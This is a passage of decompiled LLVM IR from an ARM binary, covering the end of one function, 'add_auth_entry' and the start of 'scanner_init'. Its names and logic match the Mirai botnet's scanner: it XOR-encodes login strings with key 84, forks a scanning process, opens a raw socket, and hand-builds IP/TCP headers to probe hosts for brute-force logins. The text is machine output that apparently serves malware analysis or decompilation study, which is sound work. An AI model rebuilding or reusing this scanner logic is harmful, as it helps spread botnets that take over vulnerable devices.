  store i32 %v3_eb04, i32* %r0.global-to-local, align 4
  %v2_eb14 = call i32 @__libc_fcntl(i32 %v3_eb04, i32 3)
  %v1_eb1c = or i32 %v2_eb14, 2048
  store i32 %v1_eb1c, i32* @r2, align 4
  %v0_eb20 = load i32, i32* @r4, align 4
  store i32 %v0_eb20, i32* %r0.global-to-local, align 4
  %v2_eb24 = call i32 @__libc_fcntl(i32 %v0_eb20, i32 4)
  store i32 %v2_eb24, i32* %r0.global-to-local, align 4
  %v2_eb2c = load i32, i32* @global_var_22448.145, align 4
  store i32 %v2_eb2c, i32* %r2.global-to-local, align 4
  %v1_eb34 = load i32, i32* @r5, align 4
  %v2_eb34 = add i32 %v1_eb34, 12
  %v3_eb34 = inttoptr i32 %v2_eb34 to i32*
  store i32 1, i32* %v3_eb34, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_eb40 = load i32, i32* %r2.global-to-local, align 4
  %v1_eb40 = load i32, i32* @r5, align 4
  %v2_eb40 = add i32 %v1_eb40, 8
  %v3_eb40 = inttoptr i32 %v2_eb40 to i32*
  store i32 %v0_eb40, i32* %v3_eb40, align 4
  %v0_eb44 = load i32, i32* @r5, align 4
  %v1_eb48 = add i32 %v0_eb44, 4
  %v2_eb48 = inttoptr i32 %v1_eb48 to i32*
  %v3_eb48 = load i32, i32* %v2_eb48, align 4
  store i32 %v3_eb48, i32* %r0.global-to-local, align 4
  %v1_eb4c = add i32 %v0_eb44, 20
  %v2_eb4c = inttoptr i32 %v1_eb4c to i16*
  %v3_eb4c = load i16, i16* %v2_eb4c, align 2
  %v4_eb4c = zext i16 %v3_eb4c to i32
  store i32 %v4_eb4c, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_eb60 = call i32 @__libc_connect(i32 %v3_eb48, i32 %v2_eab8, i32 16)
  store i32 %v3_eb60, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_eb64

dec_label_pc_eb64:                                ; preds = %entry.dec_label_pc_eb64_crit_edge, %dec_label_pc_eaf4
  %v1_eb6c = phi i32 [ %v1_eb6c.pre, %entry.dec_label_pc_eb64_crit_edge ], [ %v3_eb60, %dec_label_pc_eaf4 ]
  %v2_eb68 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_eb68, i32* @r4, align 4
  store i32 %v6_eaac, i32* @r5, align 4
  store i32 %v9_eaac, i32* @r6, align 4
  store i32 %v12_eaac, i32* @lr, align 4
  ret i32 %v1_eb6c

; uselistorder directives
  uselistorder i32 %v3_eae4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 5, 8, 9, 7, 6 }
  uselistorder i32 ()* @util_zero, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_eb64, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_eb74 = load i32, i32* @r4, align 4
  %v6_eb74 = load i32, i32* @r5, align 4
  %v9_eb74 = load i32, i32* @r6, align 4
  %v12_eb74 = load i32, i32* @r7, align 4
  %v15_eb74 = load i32, i32* @r8, align 4
  %v18_eb74 = load i32, i32* @sb, align 4
  %v21_eb74 = load i32, i32* @sl, align 4
  %v24_eb74 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_22414.147 to i32), i32* @fp, align 4
  %v2_eb7c = load i32, i32* @global_var_22414.147, align 4
  store i32 ptrtoint (i32* @global_var_22440.149 to i32), i32* @sl, align 4
  %v1_eb88 = add i32 %v2_eb7c, 1
  store i32 %v1_eb88, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_eb94 = load i32, i32* @global_var_22440.149, align 4
  store i32 %v2_eb94, i32* %r0.global-to-local, align 4
  %v3_eb98 = mul i32 %v1_eb88, 16
  store i32 %v3_eb98, i32* %r1.global-to-local, align 4
  %v4_eba0 = inttoptr i32 %v2_eb94 to i32*
  %v5_eba0 = call i32 @realloc(i32* %v4_eba0, i32 %v3_eb98, i32 %arg3, i32 %v1_eb88)
  %v2_eba4 = load i32, i32* @global_var_22414.147, align 4
  store i32 %v2_eba4, i32* %r2.global-to-local, align 4
  store i32 %v5_eba0, i32* @r8, align 4
  %v0_ebac = load i32, i32* @r5, align 4
  store i32 %v0_ebac, i32* %r0.global-to-local, align 4
  %v1_ebb4 = load i32, i32* @sl, align 4
  %v2_ebb4 = inttoptr i32 %v1_ebb4 to i32*
  store i32 %v5_eba0, i32* %v2_ebb4, align 4
  %v1_ebb8 = inttoptr i32 %v0_ebac to i8*
  %v2_ebb8 = call i32 @util_strlen(i8* %v1_ebb8)
  %sext = mul i32 %v2_ebb8, 16777216
  %v1_ebbc = sdiv i32 %sext, 16777216
  %v2_ebbc = add nsw i32 %v1_ebbc, 1
  store i32 %v2_ebbc, i32* @r4, align 4
  store i32 %v1_ebbc, i32* @r7, align 4
  store i32 %v2_ebbc, i32* @r0, align 4
  %v0_ebc8 = call i32 @malloc()
  store i32 %v0_ebc8, i32* %r0.global-to-local, align 4
  %v0_ebcc = load i32, i32* @r5, align 4
  store i32 %v0_ebcc, i32* %r1.global-to-local, align 4
  %v0_ebd0 = load i32, i32* @r4, align 4
  store i32 %v0_ebd0, i32* %r2.global-to-local, align 4
  store i32 %v0_ebc8, i32* %r6.global-to-local, align 4
  %v3_ebd8 = call i32 @util_memcpy(i32 %v0_ebc8, i32 %v0_ebcc, i32 %v0_ebd0)
  store i32 %v3_ebd8, i32* %r0.global-to-local, align 4
  %v0_ebdc = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_ebdc, 1
  %extract.t6 = trunc i32 %v0_ebdc to i8
  br i1 %tmp22, label %dec_label_pc_ec00, label %dec_label_pc_ebe4

dec_label_pc_ebe4:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ebe8

dec_label_pc_ebe8:                                ; preds = %dec_label_pc_ebe8, %dec_label_pc_ebe4
  %v2_ebf0 = phi i32 [ %v1_ebf4, %dec_label_pc_ebe8 ], [ 0, %dec_label_pc_ebe4 ]
  %v1_ebe8 = load i32, i32* %r6.global-to-local, align 4
  %v2_ebe8 = add i32 %v1_ebe8, %v2_ebf0
  %v3_ebe8 = inttoptr i32 %v2_ebe8 to i8*
  %v4_ebe8 = load i8, i8* %v3_ebe8, align 1
  %v6_ebe8 = zext i8 %v4_ebe8 to i32
  %v1_ebec = xor i32 %v6_ebe8, 84
  store i32 %v1_ebec, i32* %r3.global-to-local, align 4
  %v1_ebf0 = trunc i32 %v1_ebec to i8
  store i8 %v1_ebf0, i8* %v3_ebe8, align 1
  %v0_ebf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_ebf4 = add i32 %v0_ebf4, 1
  store i32 %v1_ebf4, i32* %r2.global-to-local, align 4
  %v1_ebf8 = load i32, i32* @r7, align 4
  %v9_ebf8 = icmp eq i32 %v1_ebf4, %v1_ebf8
  br i1 %v9_ebf8, label %dec_label_pc_ec00.loopexit, label %dec_label_pc_ebe8

dec_label_pc_ec00.loopexit:                       ; preds = %dec_label_pc_ebe8
  %extract.t = trunc i32 %v1_ebf4 to i8
  br label %dec_label_pc_ec00

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ec00.loopexit, %entry
  %v0_ec10.off0 = phi i8 [ %extract.t, %dec_label_pc_ec00.loopexit ], [ %extract.t6, %entry ]
  %v2_ec00 = load i32, i32* @global_var_22414.147, align 4
  %v2_ec04 = load i32, i32* @global_var_22440.149, align 4
  %v3_ec08 = mul i32 %v2_ec00, 16
  store i32 %v3_ec08, i32* @sb, align 4
  %v2_ec0c = add i32 %v2_ec04, %v3_ec08
  store i32 %v2_ec0c, i32* %r2.global-to-local, align 4
  %v3_ec10 = add i32 %v2_ec0c, 12
  %v4_ec10 = inttoptr i32 %v3_ec10 to i8*
  store i8 %v0_ec10.off0, i8* %v4_ec10, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_eba4, i32* %r3.global-to-local, align 4
  %v0_ec1c = load i32, i32* %r6.global-to-local, align 4
  %v1_ec1c = load i32, i32* @r8, align 4
  %v5_ec1c = mul i32 %v2_eba4, 16
  %v6_ec1c = add i32 %v1_ec1c, %v5_ec1c
  %v7_ec1c = inttoptr i32 %v6_ec1c to i32*
  store i32 %v0_ec1c, i32* %v7_ec1c, align 4
  %v2_ec20 = load i32, i32* @global_var_22440.149, align 4
  store i32 %v2_ec20, i32* @r7, align 4
  %v1_ec24 = inttoptr i32 %arg2 to i8*
  %v2_ec24 = call i32 @util_strlen(i8* %v1_ec24)
  %sext1 = mul i32 %v2_ec24, 16777216
  %v1_ec28 = sdiv i32 %sext1, 16777216
  %v2_ec28 = add nsw i32 %v1_ec28, 1
  store i32 %v2_ec28, i32* @r4, align 4
  store i32 %v1_ec28, i32* @r6, align 4
  store i32 %v2_ec28, i32* @r0, align 4
  %v0_ec34 = call i32 @malloc()
  store i32 %v0_ec34, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_ec3c = load i32, i32* @r4, align 4
  store i32 %v0_ec3c, i32* %r2.global-to-local, align 4
  store i32 %v0_ec34, i32* %r5.global-to-local, align 4
  %v3_ec44 = call i32 @util_memcpy(i32 %v0_ec34, i32 %arg2, i32 %v0_ec3c)
  store i32 %v3_ec44, i32* %r0.global-to-local, align 4
  %v0_ec48 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_ec48, 1
  %extract.t8 = trunc i32 %v0_ec48 to i8
  br i1 %tmp23, label %dec_label_pc_ec6c, label %dec_label_pc_ec50

dec_label_pc_ec50:                                ; preds = %dec_label_pc_ec00
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec54

dec_label_pc_ec54:                                ; preds = %dec_label_pc_ec54, %dec_label_pc_ec50
  %v2_ec5c = phi i32 [ %v1_ec60, %dec_label_pc_ec54 ], [ 0, %dec_label_pc_ec50 ]
  %v1_ec54 = load i32, i32* %r5.global-to-local, align 4
  %v2_ec54 = add i32 %v1_ec54, %v2_ec5c
  %v3_ec54 = inttoptr i32 %v2_ec54 to i8*
  %v4_ec54 = load i8, i8* %v3_ec54, align 1
  %v6_ec54 = zext i8 %v4_ec54 to i32
  %v1_ec58 = xor i32 %v6_ec54, 84
  store i32 %v1_ec58, i32* %r3.global-to-local, align 4
  %v1_ec5c = trunc i32 %v1_ec58 to i8
  store i8 %v1_ec5c, i8* %v3_ec54, align 1
  %v0_ec60 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec60 = add i32 %v0_ec60, 1
  store i32 %v1_ec60, i32* %r2.global-to-local, align 4
  %v1_ec64 = load i32, i32* @r6, align 4
  %v9_ec64 = icmp eq i32 %v1_ec60, %v1_ec64
  br i1 %v9_ec64, label %dec_label_pc_ec6c.loopexit, label %dec_label_pc_ec54

dec_label_pc_ec6c.loopexit:                       ; preds = %dec_label_pc_ec54
  %extract.t7 = trunc i32 %v1_ec60 to i8
  br label %dec_label_pc_ec6c

dec_label_pc_ec6c:                                ; preds = %dec_label_pc_ec6c.loopexit, %dec_label_pc_ec00
  %v0_ec7c.off0 = phi i8 [ %extract.t7, %dec_label_pc_ec6c.loopexit ], [ %extract.t8, %dec_label_pc_ec00 ]
  %v2_ec6c = load i32, i32* @global_var_22414.147, align 4
  store i32 %v2_ec6c, i32* %r0.global-to-local, align 4
  %v2_ec70 = load i32, i32* @global_var_22440.149, align 4
  %v3_ec74 = mul i32 %v2_ec6c, 16
  store i32 %v3_ec74, i32* %r1.global-to-local, align 4
  %v2_ec78 = or i32 %v3_ec74, 13
  %v3_ec7c = add i32 %v2_ec78, %v2_ec70
  %v4_ec7c = inttoptr i32 %v3_ec7c to i8*
  store i8 %v0_ec7c.off0, i8* %v4_ec7c, align 1
  store i32 ptrtoint (i16** @global_var_22444.151 to i32), i32* %r4.global-to-local, align 4
  %v2_ec88 = load i16, i16* bitcast (i16** @global_var_22444.151 to i16*), align 4
  %v3_ec88 = zext i16 %v2_ec88 to i32
  store i32 %v3_ec88, i32* %lr.global-to-local, align 4
  %v2_ec90 = load i32, i32* @global_var_22440.149, align 4
  store i32 %v2_ec90, i32* %r2.global-to-local, align 4
  %v0_ec98 = load i32, i32* %r1.global-to-local, align 4
  %v2_ec98 = add i32 %v0_ec98, %v2_ec90
  store i32 %v2_ec98, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22444.151 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_eca0 = load i32, i32* @sb, align 4
  %v1_eca0 = load i32, i32* @r7, align 4
  %v2_eca0 = add i32 %v1_eca0, %v0_eca0
  store i32 %v2_eca0, i32* %ip.global-to-local, align 4
  %v0_eca4 = load i32, i32* %r0.global-to-local, align 4
  %v1_eca4 = add i32 %v0_eca4, 1
  store i32 %v1_eca4, i32* %r0.global-to-local, align 4
  %v3_eca8 = add i32 %v2_ec98, 10
  %v4_eca8 = inttoptr i32 %v3_eca8 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_22444.151 to i32), i32 16), i32 16) to i16), i16* %v4_eca8, align 2
  %v0_ecac = load i32, i32* %lr.global-to-local, align 4
  %v1_ecac = trunc i32 %v0_ecac to i16
  %v2_ecac = load i32, i32* %r1.global-to-local, align 4
  %v3_ecac = add i32 %v2_ecac, 8
  %v4_ecac = inttoptr i32 %v3_ecac to i16*
  store i16 %v1_ecac, i16* %v4_ecac, align 2
  %v0_ecb0 = load i32, i32* %r5.global-to-local, align 4
  %v1_ecb0 = load i32, i32* %ip.global-to-local, align 4
  %v2_ecb0 = add i32 %v1_ecb0, 4
  %v3_ecb0 = inttoptr i32 %v2_ecb0 to i32*
  store i32 %v0_ecb0, i32* %v3_ecb0, align 4
  %v1_ecb4 = load i32, i32* @fp, align 4
  %v2_ecb4 = inttoptr i32 %v1_ecb4 to i32*
  store i32 %v1_eca4, i32* %v2_ecb4, align 4
  %v0_ecb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_ecb8 = trunc i32 %v0_ecb8 to i16
  %v2_ecb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_ecb8 = inttoptr i32 %v2_ecb8 to i16*
  store i16 %v1_ecb8, i16* %v3_ecb8, align 2
  store i32 %v3_eb74, i32* @r4, align 4
  store i32 %v6_eb74, i32* @r5, align 4
  store i32 %v9_eb74, i32* @r6, align 4
  store i32 %v12_eb74, i32* @r7, align 4
  store i32 %v15_eb74, i32* @r8, align 4
  store i32 %v18_eb74, i32* @sb, align 4
  store i32 %v21_eb74, i32* @sl, align 4
  store i32 %v24_eb74, i32* @fp, align 4
  ret i32 %v1_eca4

; uselistorder directives
  uselistorder i32 %v3_ec74, { 1, 0 }
  uselistorder i32 %v1_ec60, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ec34, { 1, 0, 2 }
  uselistorder i32 %v3_ec08, { 1, 0 }
  uselistorder i32 %v1_ebf4, { 0, 2, 3, 1 }
  uselistorder i32 %v0_ebc8, { 1, 0, 2 }
  uselistorder i32 %v2_eba4, { 1, 0, 2 }
  uselistorder i32 %v3_eb98, { 1, 0 }
  uselistorder i32 %v1_eb88, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 5, 6, 0, 1, 2, 3, 4, 27, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp334 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_ecd4 = load i32, i32* @r5, align 4
  %v18_ecd4 = load i32, i32* @sb, align 4
  %v21_ecd4 = load i32, i32* @sl, align 4
  %v24_ecd4 = load i32, i32* @fp, align 4
  %v0_ece0 = call i32 @__libc_fork()
  %v7_ece4 = icmp eq i32 %v0_ece0, -1
  %. = zext i1 %v7_ece4 to i32
  %tmp369 = icmp slt i32 %v0_ece0, 1
  %storemerge328 = select i1 %tmp369, i32 %., i32 1
  store i32 %storemerge328, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24f34.143 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ed00 = icmp eq i32 %storemerge328, 0
  store i1 %v2_ed00, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_ece0, i32* @global_var_24f34.143, align 4
  br i1 %v2_ed00, label %dec_label_pc_ed1c, label %dec_label_pc_ed0c

dec_label_pc_ed0c:                                ; preds = %entry
  store i32 %v6_ecd4, i32* @r5, align 4
  store i32 %v18_ecd4, i32* @sb, align 4
  store i32 %v21_ecd4, i32* @sl, align 4
  store i32 %v24_ecd4, i32* @fp, align 4
  ret i32 %v0_ece0

dec_label_pc_ed1c:                                ; preds = %entry
  %v0_ed1c = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_ed1c, i32* @global_var_24f10.62, align 4
  %v1_ed28 = call i32 @rand_init(i32 %v0_ed1c)
  %v0_ed2c = load i32, i32* @r4, align 4
  %v1_ed30 = inttoptr i32 %v0_ed2c to i32*
  %v2_ed30 = call i32 @__GI_time(i32* %v1_ed30)
  store i32 ptrtoint (i32* @global_var_22448.145 to i32), i32* %r2.global-to-local, align 4
  store i32 388, i32* %r1.global-to-local, align 4
  store i32 %v2_ed30, i32* @global_var_22448.145, align 4
  %v2_ed44 = call i32 @calloc(i32 356, i32 388)
  store i32 ptrtoint (i32* @global_var_24f2c.156 to i32), i32* %r3.global-to-local, align 4
  %v0_ed4c = load i32, i32* @r4, align 4
  store i32 %v0_ed4c, i32* %stack_var_-52, align 4
  store i32 %v2_ed44, i32* @global_var_24f2c.156, align 4
  store i32 %v0_ed4c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_ed58

dec_label_pc_ed58:                                ; preds = %dec_label_pc_ed58.dec_label_pc_ed58_crit_edge, %dec_label_pc_ed1c
  %v2_ed74 = phi i32 [ %v2_ed74.pre, %dec_label_pc_ed58.dec_label_pc_ed58_crit_edge ], [ %v2_ed44, %dec_label_pc_ed1c ]
  %v0_ed5c = phi i32 [ %v0_eda4, %dec_label_pc_ed58.dec_label_pc_ed58_crit_edge ], [ %v0_ed4c, %dec_label_pc_ed1c ]
  %v1_ed7c = add i32 %v0_ed5c, 1
  store i32 %v1_ed7c, i32* %ip.global-to-local, align 4
  %v3_ed80 = mul i32 %v0_ed5c, 388
  %v2_ed88 = add i32 %v3_ed80, %v2_ed74
  store i32 %v2_ed88, i32* @r3, align 4
  store i32 %v2_ed88, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ed9c = add i32 %v2_ed88, 4
  %v3_ed9c = inttoptr i32 %v2_ed9c to i32*
  store i32 -1, i32* %v3_ed9c, align 4
  %v0_eda0 = load i32, i32* @r5, align 4
  %v1_eda0 = load i32, i32* %r1.global-to-local, align 4
  %v2_eda0 = add i32 %v1_eda0, 12
  %v3_eda0 = inttoptr i32 %v2_eda0 to i32*
  store i32 %v0_eda0, i32* %v3_eda0, align 4
  %v0_eda4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_eda4, i32* %stack_var_-52, align 4
  %v5_eda8 = icmp slt i32 %v1_ed7c, 356
  br i1 %v5_eda8, label %dec_label_pc_ed58.dec_label_pc_ed58_crit_edge, label %dec_label_pc_edac

dec_label_pc_ed58.dec_label_pc_ed58_crit_edge:    ; preds = %dec_label_pc_ed58
  %v2_ed74.pre = load i32, i32* @global_var_24f2c.156, align 4
  br label %dec_label_pc_ed58

dec_label_pc_edac:                                ; preds = %dec_label_pc_ed58
  %v8_ed98 = icmp eq i32 %v1_ed7c, 356
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_ed98, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_edb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_edb4 = add i32 %v0_edb4, 7
  store i32 %v1_edb4, i32* %r2.global-to-local, align 4
  %v3_edb8 = call i32 @socket(i32 2, i32 3, i32 %v1_edb4)
  store i32 ptrtoint (i32* @global_var_24f30.158 to i32), i32* @lr, align 4
  %v2_edc0 = icmp eq i32 %v3_edb8, -1
  store i1 %v2_edc0, i1* %cpsr_c.global-to-local, align 1
  %v7_edc0 = icmp eq i32 %v3_edb8, -1
  store i1 %v7_edc0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_edb8, i32* @r4, align 4
  store i32 %v3_edb8, i32* @global_var_24f30.158, align 4
  br i1 %v7_edc0, label %dec_label_pc_10454, label %dec_label_pc_edd0

dec_label_pc_edd0:                                ; preds = %dec_label_pc_edac
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_edd4 = load i32, i32* @r5, align 4
  store i32 %v0_edd4, i32* @r2, align 4
  %v2_edd8 = call i32 @__libc_fcntl(i32 %v3_edb8, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_ede0 = or i32 %v2_edd8, 2048
  store i32 %v1_ede0, i32* @r2, align 4
  %v0_ede4 = load i32, i32* @r4, align 4
  %v2_ede8 = call i32 @__libc_fcntl(i32 %v0_ede4, i32 4)
  %v2_edf0 = ptrtoint i32* %stack_var_-56 to i32
  %v2_edf4 = load i32, i32* @global_var_24f30.158, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_edfc = load i32, i32* @r5, align 4
  store i32 %v0_edfc, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_ee04 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_ee04, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_ee14 = call i32 @__GI_setsockopt(i32 %v2_edf4, i32 %v0_edfc, i32 3, i32 %v2_ee04, i32 4)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee18 = icmp eq i32 %v5_ee14, 0
  store i1 %v2_ee18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee18, label %dec_label_pc_ee20, label %dec_label_pc_10448

dec_label_pc_ee20:                                ; preds = %dec_label_pc_edd0, %dec_label_pc_ee20
  %v0_ee20 = call i32 @rand_next()
  %v1_ee30 = mul i32 %v0_ee20, 256
  %v3_ee34 = and i32 %v1_ee30, 65280
  %tmp372 = udiv i32 %v0_ee20, 256
  %v4_ee38 = urem i32 %tmp372, 256
  %v5_ee38 = or i32 %v4_ee38, %v3_ee34
  store i32 %v5_ee38, i32* %r3.global-to-local, align 4
  %v2_ee3c = icmp ugt i32 %v5_ee38, 1023
  store i1 %v2_ee3c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee3c = icmp eq i32 %v5_ee38, 1024
  store i1 %v7_ee3c, i1* %cpsr_z.global-to-local, align 1
  %v3_ee40 = icmp ult i32 %v5_ee38, 1022
  br i1 %v3_ee40, label %dec_label_pc_ee20, label %dec_label_pc_ee44

dec_label_pc_ee44:                                ; preds = %dec_label_pc_ee20
  %v5_ee2c.le = trunc i32 %v0_ee20 to i16
  store i32 ptrtoint (i8** @global_var_22418.160 to i32), i32* %ip.global-to-local, align 4
  %v2_ee48 = load i8, i8* bitcast (i8** @global_var_22418.160 to i8*), align 4
  %v3_ee48 = zext i8 %v2_ee48 to i32
  %v1_ee4c = and i32 %v3_ee48, 240
  %v1_ee50 = or i32 %v1_ee4c, 5
  store i32 %v1_ee50, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_22418.160 to i8*), align 4
  store i16 10240, i16* bitcast (i32* @global_var_2241a.161 to i16*), align 4
  %v0_ee70 = call i32 @rand_next()
  %v1_ee70 = trunc i32 %v0_ee70 to i16
  %v3_ee78 = load i8, i8* @global_var_22438.164, align 1
  store i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32* @lr, align 4
  store i32 ptrtoint (i8** @global_var_22418.160 to i32), i32* %ip.global-to-local, align 4
  %v1_ee88 = urem i8 %v3_ee78, 16
  store i16 %v1_ee70, i16* bitcast (i32* @global_var_2241c.165 to i16*), align 4
  %v1_ee90 = or i8 %v1_ee88, 80
  store i32 64, i32* %r3.global-to-local, align 4
  store i8 64, i8* bitcast (i32* @global_var_22420.166 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_22421.167 to i8*), align 4
  store i8 %v1_ee90, i8* @global_var_22438.164, align 1
  %v4_eea8 = sext i16 %v5_ee2c.le to i32
  store i32 %v4_eea8, i32* %r2.global-to-local, align 4
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* @global_var_2242e.168, align 2
  store i16 %v5_ee2c.le, i16* bitcast (i32* @global_var_2242c.163 to i16*), align 4
  %v0_eeb8 = call i32 @rand_next()
  %v1_eeb8 = trunc i32 %v0_eeb8 to i16
  store i32 ptrtoint (i32* @global_var_2242c.163 to i32), i32* %ip.global-to-local, align 4
  %v3_eec0 = load i8, i8* @global_var_22439.169, align 1
  %v4_eec0 = zext i8 %v3_eec0 to i32
  %v1_eec4 = or i32 %v4_eec0, 2
  store i32 %v1_eec4, i32* %r3.global-to-local, align 4
  store i16 %v1_eeb8, i16* bitcast (i32* @global_var_2243a.170 to i16*), align 4
  %v1_eecc = trunc i32 %v1_eec4 to i8
  store i8 %v1_eecc, i8* @global_var_22439.169, align 1
  store i32 ptrtoint (i32* @global_var_19a7c.174 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_eedc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a78.172 to i32), i32 ptrtoint (i32* @global_var_19a7c.174 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19a80.176 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_eeec = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a78.172 to i32), i32 ptrtoint ([5 x i8]* @global_var_19a80.176 to i32), i32 8)
  store i32 ptrtoint ([9 x i8]* @global_var_19a88.178 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_eefc = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a78.172 to i32), i32 ptrtoint ([9 x i8]* @global_var_19a88.178 to i32), i32 12)
  store i32 ptrtoint (i32* @global_var_19a7c.174 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_ef0c = call i32 @add_auth_entry(i32 ptrtoint ([8 x i8]* @global_var_19a94.180 to i32), i32 ptrtoint (i32* @global_var_19a7c.174 to i32), i32 7)
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19a9c.182 to i32), i32* %r1.global-to-local, align 4
  %v5_ef1c = call i32 @add_auth_entry(i32 ptrtoint ([6 x i8]* @global_var_19a9c.182 to i32), i32 ptrtoint ([6 x i8]* @global_var_19a9c.182 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_19aa4.184 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_ef2c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a78.172 to i32), i32 ptrtoint ([6 x i8]* @global_var_19aa4.184 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_19a94.180 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_ef3c = call i32 @add_auth_entry(i32 ptrtoint ([5 x i8]* @global_var_19a78.172 to i32), i32 ptrtoint ([8 x i8]* @global_var_19a94.180 to i32), i32 11)
